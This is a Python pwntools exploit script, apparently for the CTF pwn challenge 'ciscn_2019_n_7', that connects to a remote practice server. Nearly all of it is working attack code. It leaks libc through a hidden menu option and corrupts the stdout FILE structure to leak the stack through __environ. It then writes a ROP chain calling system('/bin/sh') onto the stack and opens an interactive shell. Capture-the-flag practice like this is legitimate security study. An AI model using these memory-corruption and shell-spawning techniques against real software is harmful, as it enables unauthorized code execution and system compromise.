from pwn import *

#context.log_level = 'debug'

#p = process('./ciscn_2019_n_7')
p = remote('node4.buuoj.cn', 29629)
elf = ELF('ciscn_2019_n_7')
libc = ELF('libc-2.23.buu.so')

ru = lambda s : p.recvuntil(s)
sn = lambda s : p.send(s)
sla = lambda r, s : p.sendlineafter(r, s)
sa = lambda r, s : p.sendafter(r, s)
sl = lambda s : p.sendline(s)
rv = lambda s : p.recv(s)

def debug(s):
	gdb.attach(p, '''
		source ~/pwn/.debug/loadsym.py
		loadsym ~/pwn/.debug/libc-2.23.64.so
	''' + s)

def alloc(size, name, addr):
	sla(b'choice->', b'1')
	sla(b'Length:', str(size))
	sa(b'name:', name + addr)

def edit(name, addr, content):
	sla(b'choice->', b'2')
	sa(b'name:', name + addr)
	sa(b'contents:', content)
	
def show():
	sla(b'choice->', b'3')
	
	
sla(b'choice->', b'666')

ru(b'0x')
libc_base = int(rv(12), 16) - libc.sym['puts']
stdout = libc_base + libc.sym['_IO_2_1_stdout_']
environ = libc_base + libc.sym['__environ']

success('libc_base -> {}'.format(hex(libc_base)))

alloc(0x90, b'qwqqwqqw', p64(stdout))

edit(b'a', b'a', p64(0xfbad1800) + p64(environ) * 4 + p64(environ + 8))

stack = u64(ru(b'\x7f')[-6:].ljust(8, b'\x00')) + ( 0x7fff6a7ef788 - 0x7fff6a7ef878 )
success('stack -> {}'.format(hex(stack)))

system = libc_base + libc.sym['system']
bin_sh = libc_base + next(libc.search(b'/bin/sh\x00'))

pop_rdi_ret = 0x21102 + libc_base

rop = p64(pop_rdi_ret) + p64(bin_sh) + p64(system)

edit(b'qwqqwqqw', p64(stack), rop)

#debug('b *$rebase(0xae6)')

sla(b'choice->', b'5')

ru(b'! ')

p.interactive()


